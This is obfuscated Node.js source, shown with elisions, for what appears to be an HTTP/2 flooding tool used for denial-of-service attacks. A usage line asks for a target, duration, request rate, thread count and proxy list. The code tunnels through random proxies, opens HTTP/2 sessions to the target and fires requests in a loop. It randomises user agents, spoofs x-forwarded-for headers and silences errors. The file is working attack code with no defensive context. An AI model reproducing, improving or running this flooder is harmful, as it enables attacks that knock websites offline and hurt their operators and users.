...
function getRandomUserAgent() {
    const _0x30c77a = [
        ...
        _0x4c59a4 = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'],
        _0x5a7c3c = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'],
        _0xff91 = ['US', 'GB', 'FR', 'DE', 'ES', 'UK', 'BR'],
        _0x2783ec = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'],
        _0x18945a = _0x30c77a[Math.floor(Math.random() * _0x30c77a.length)],
        _0x3894e0 = _0x4c59a4[Math.floor(Math.random() * _0x4c59a4.length)],
        _0x2b5aa4 = _0x5a7c3c[Math.floor(Math.random() * _0x5a7c3c.length)],
        _0x363f07 = _0xff91[Math.floor(Math.random() * _0xff91.length)],
        _0x430e92 = _0x2783ec[Math.floor(Math.random() * _0x2783ec.length)],
        _0x43a486 = Math.floor(Math.random() * 100) + 1,
        _0x10595e = Math.floor(Math.random() * 6) + 1,
        _0xaa88b8 =
        _0x430e92 +
        '/' +
        _0x3894e0 +
        ...
        _0x2b5aa4 +
        ')',
        _0x1c7ab2 = btoa(_0xaa88b8)
    let _0x522f3a = ''
    for (let _0x2f5341 = 0; _0x2f5341 < _0x1c7ab2.length; _0x2f5341++) {
        _0x2f5341 % _0x10595e === 0 ?
            (_0x522f3a += _0x1c7ab2.charAt(_0x2f5341)) :
            (_0x522f3a += _0x1c7ab2.charAt(_0x2f5341).toUpperCase())
    }
    return _0x522f3a
}
...
process.argv.length < 7 &&
    (console.log('node HTTPS.js target time rate thread proxy.txt'),
        process.exit())
...
class NetSocket {
    constructor() {}
        ['HTTP'](_0x1671f4, _0x46f728) {
            const _0x5a4870 = _0x1671f4.address.split(':'),
                _0x4fdd51 = _0x5a4870[0],
                _0x4dac33 =
                'CONNECT ' +
                _0x1671f4.address +
                ':443 HTTP/1.1\r\nHost: ' +
                ...
                _0x14bb54 = new Buffer.from(_0x4dac33),
                _0x357d1f = net.connect({
                    host: _0x1671f4.host,
                    port: _0x1671f4.port,
                    allowHalfOpen: true,
                    writable: true,
            ...
            _0x357d1f.setTimeout(_0x1671f4.timeout * 100000)
            _0x357d1f.setKeepAlive(true, 100000)
            _0x357d1f.setNoDelay(true)
            _0x357d1f.on('connect', () => {
                _0x357d1f.write(_0x14bb54)
            })
            _0x357d1f.on('data', (_0x39670b) => {
                const _0x2fe074 = _0x39670b.toString('utf-8'),
                    _0x5597ff = _0x2fe074.includes('HTTP/1.1 200')
                if (_0x5597ff === false) {
                    return (
                        _0x357d1f.destroy(),
                        _0x46f728(undefined, 'error: invalid response from proxy server')
                    )
                }
                return _0x46f728(_0x357d1f, undefined)
            })
            _0x357d1f.on('timeout', () => {
                return (
                    _0x357d1f.destroy(), _0x46f728(undefined, 'error: timeout exceeded')
                )
            })
            _0x357d1f.on('error', (_0x342e8a) => {
                return _0x357d1f.destroy(), _0x46f728(undefined, 'error: ' + _0x342e8a)
            })
        }
}
const Socker = new NetSocket()
function readLines(_0x55f530) {
    return fs.readFileSync(_0x55f530, 'utf-8').toString().split(/\r?\n/)
}
function randomIntn(_0x20fd2a, _0x40264c) {
    return Math.floor(Math.random() * (_0x40264c - _0x20fd2a) + _0x20fd2a)
}
function randomElement(_0x1432a0) {
    return _0x1432a0[randomIntn(0, _0x1432a0.length)]
}
function randomCharacters(_0x43df14) {
    output = ''
    for (let _0x5cb825 = 0; _0x5cb825 < _0x43df14; _0x5cb825++) {
...
function runFlooder() {
    const _0x56afce = randomElement(proxies),
        _0x2033c4 = _0x56afce.split(':')
    headers[':authority'] = parsedTarget.host
    headers['user-agent'] = randomElement(userAgents)
    headers['x-forwarded-for'] = _0x2033c4[0]
    const _0x55a3e0 = {
        host: _0x2033c4[0],
        port: ~~_0x2033c4[1],
    ...
    Socker.HTTP(_0x55a3e0, (_0x5d5d9d, _0x597ff5) => {
        if (_0x597ff5) {
            return
        }
        _0x5d5d9d.setKeepAlive(true, 600000)
        _0x5d5d9d.setNoDelay(true)
        const _0x11ab48 = {
                port: 443,
                secure: true,
                ALPNProtocols: ['h2'],
            ...
            _0x64d810 = tls.connect(443, parsedTarget.host, _0x11ab48)
        _0x64d810.allowHalfOpen = true
        _0x64d810.setNoDelay(true)
        _0x64d810.setKeepAlive(true, 60000)
        _0x64d810.setMaxListeners(0)
        const _0x2cd362 = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: _0x397ba3,
            maxSessionMemory: 655000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => _0x64d810,
        })
        _0x2cd362.setMaxListeners(0)
        _0x2cd362.settings(_0x397ba3)
        _0x2cd362.on('connect', () => {
            const _0x512e65 = setInterval(() => {
                for (let _0x36e9bc = 0; _0x36e9bc < args.Rate; _0x36e9bc++) {
                    headers.referer = 'https://' + parsedTarget.host + parsedTarget.path
                    const _0x514cf9 = _0x2cd362
                        .request(headers)
                        .on('response', (_0x2bfb8d) => {
                            _0x514cf9.close()
                            _0x514cf9.destroy()
                            return
                        })
...
process.on('uncaughtException', (_0x3b9060) => {})
process.on('unhandledRejection', (_0x3f6b98) => {})